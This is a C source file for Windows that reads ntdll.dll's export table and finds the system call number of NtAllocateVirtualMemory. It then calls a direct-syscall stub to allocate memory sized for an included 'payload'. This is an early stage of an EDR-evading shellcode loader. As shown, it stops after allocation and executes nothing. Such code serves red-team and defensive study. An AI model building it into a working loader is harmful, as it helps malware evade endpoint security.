#include <windows.h>
#include <stdio.h>
#include "Payload.h"

DWORD NtAllocateVirtualMemory_SSN;

extern NTSTATUS NTAPI Sys_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection
);

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

DWORD GetSSN( HMODULE hModule, LPCSTR lpFunctionName ) {

    PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )hModule;

    if ( pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid DOS header\n" );
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( PBYTE )hModule + pDosHeader->e_lfanew );

    if ( pNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid NT header\n" );
        return 0;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = ( PIMAGE_EXPORT_DIRECTORY )( ( PBYTE )hModule + pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );

    if ( pExportDirectory->NumberOfNames == 0 ) {
        fprintf( stderr, "[-] No exported functions\n" );
        return 0;
    }

    PDWORD pAddressOfNames = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNames );
    PDWORD pAddressOfFunctions = ( PDWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfFunctions );
    PWORD pAddressOfNameOrdinals = ( PWORD )( ( PBYTE )hModule + pExportDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < pExportDirectory->NumberOfNames; i++ ) {
        LPCSTR pFunctionName = ( LPCSTR )( ( PBYTE )hModule + pAddressOfNames[ i ] );

        if ( _stricmp( pFunctionName, lpFunctionName ) != 0 ) {
            continue;
        }

        printf( "[+] Exported function: %s\n", pFunctionName );

        BYTE* pFunctionAddress = ( BYTE* )( ( PBYTE )hModule + pAddressOfFunctions[ pAddressOfNameOrdinals[ i ] ] );
        printf( "[+] Function address: 0x%p\n", pFunctionAddress );

        for ( DWORD j = 0; j < 32; j++ ) {
            if ( pFunctionAddress[ j ] == 0x4C
                && pFunctionAddress[ j + 1 ] == 0x8B
                && pFunctionAddress[ j + 2 ] == 0xD1
                && pFunctionAddress[ j + 3 ] == 0xB8
                && pFunctionAddress[ j + 6 ] == 0x00
                && pFunctionAddress[ j + 7 ] == 0x00 ) {

                DWORD dwSSN = *( DWORD* )( pFunctionAddress + j + 4 );
                // printf( "[+] Found SSN: 0x%X\n", dwSSN );
                return dwSSN;
            }
        }
    }

    return 0;

}

int main( void ) {

    HMODULE hNtdll = LoadLibraryA( "ntdll.dll" );

    DWORD SSN = GetSSN( hNtdll, "NtAllocateVirtualMemory" );

    if (!SSN) {
        fprintf( stderr, "[-] Failed to get SSN\n" );
        return 1;
    }

    printf( "[+] SSN: 0x%X\n", SSN );

    NtAllocateVirtualMemory_SSN = SSN;

    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = ( SIZE_T )payloadSize;
    status = Sys_NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress, 0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] Failed to allocate memory: 0x%X\n", status );
        return 1;
    }

    printf( "[+] Allocated %d bytes at %p\n", payloadSize, baseAddress );



    return 0;

}   